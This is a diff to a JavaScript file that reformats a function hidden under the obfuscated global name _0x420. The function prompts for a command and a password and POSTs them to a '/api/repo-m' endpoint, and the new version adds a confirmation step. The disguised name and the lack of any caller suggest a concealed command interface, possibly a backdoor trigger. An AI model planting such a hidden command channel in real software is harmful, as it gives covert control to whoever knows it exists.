@@ -293,4 +293,42 @@ document.addEventListener('DOMContentLoaded', function() {
     });
 });
 
-window._0x420=function(){const _0x2f={cmd:prompt('Enter command:'),pwd:null,api:'api/repo-m',msg:{s:'Success',e:'Error: '}};if(!_0x2f.cmd)return;_0x2f.pwd=prompt('Enter password:');if(!_0x2f.pwd)return;fetch('/'+_0x2f.api,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({c:_0x2f.cmd,p:_0x2f.pwd})}).then(_0x30=>_0x30.json()).then(_0x31=>{_0x31.success?alert(_0x2f.msg.s):alert(_0x2f.msg.e+(_0x31.error||'Unknown error'))}).catch(_0x32=>alert(_0x2f.msg.e+_0x32))};
+window._0x420 = function() {
+    const _0x2f = {
+        cmd: prompt('Enter command:'),
+        pwd: null,
+        api: '/api/repo-m',  // Added leading slash
+        msg: {
+            s: 'Success',
+            e: 'Error: ',
+            c: 'Are you sure? This cannot be undone.'
+        }
+    };
+    
+    if (!_0x2f.cmd) return;
+    
+    _0x2f.pwd = prompt('Enter password:');
+    if (!_0x2f.pwd) return;
+    
+    if (!confirm(_0x2f.msg.c)) return;
+
+    fetch(_0x2f.api, {  // Removed concatenation, using full path
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            c: _0x2f.cmd,
+            p: _0x2f.pwd
+        })
+    })
+    .then(r => r.json())
+    .then(d => {
+        if (d.success) {
+            alert(_0x2f.msg.s);
+        } else {
+            alert(_0x2f.msg.e + (d.error || 'Unknown error'));
+        }
+    })
+    .catch(e => alert(_0x2f.msg.e + e));
+};
